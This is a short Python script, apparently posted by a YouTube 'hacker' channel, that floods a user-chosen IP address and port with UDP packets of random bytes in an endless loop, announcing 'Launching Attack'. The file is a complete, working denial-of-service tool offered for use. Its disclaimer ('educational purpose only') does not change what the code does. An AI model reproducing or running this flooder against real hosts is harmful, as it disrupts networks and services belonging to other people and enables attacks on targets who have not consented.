import sys
import os
import random
import socket
from sys import platform

########################################
########################################
# Educational purpose only             #
########################################
# I'm not responsible for your actions #
########################################
########################################

"""
Created By: TheTechHacker
==========================
SUBSCRIBE: https://www.youtube.com/channel/UCKAmv8p_TRvUNrJlfiB8qBQ
"""

if platform == "linux" or platform == "linux2":
    os.system("clear")
elif platform == "darwin":
    os.system("clear")
    print("This Script Works Best on Kali linux")
elif platform == "win32":
    os.system("cls")
else:
    print("\033[1;34m [-]Unknown System Detected \033[1;m")

print("\033[1;32m")

connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print("""
     _      _      _
    (.)< __(.)> __(.)=
  \___)  \___)  \___)   Ready To Send
  
=======================================
     Created By: TheTechHacker
=======================================
If You Use too much bytes 
You're Internet might get a bit slow
=======================================
""")

try:
    size = int(input("bytes> "))
    attack = random.randbytes(size)  # random._urandom digantikan dengan random.randbytes
    ip = input("IP> ")
    port = int(input("port> "))
    print(" ")
    print("Launching Attack")
    print(" ")
except ValueError:
    print(" ")
    exit("\033[1;34m Invalid Input \033[1;m")
except KeyboardInterrupt:
    print(" ")
    exit("\033[1;34m [-]Canceled By User \033[1;m")

while True:
    try:
        sent = connect.sendto(attack, (ip, port))
        if sent:
            print(sent)
            print(f"Data sent successfully, {sent} bytes sent ===>")  # Pesan jika data berhasil dikirim
        else:
            print("Failed to send data.")  # Pesan jika data gagal dikirim
    except KeyboardInterrupt:
        print(" ")
        exit("\033[1;34m [-]Canceled By User \033[1;m")
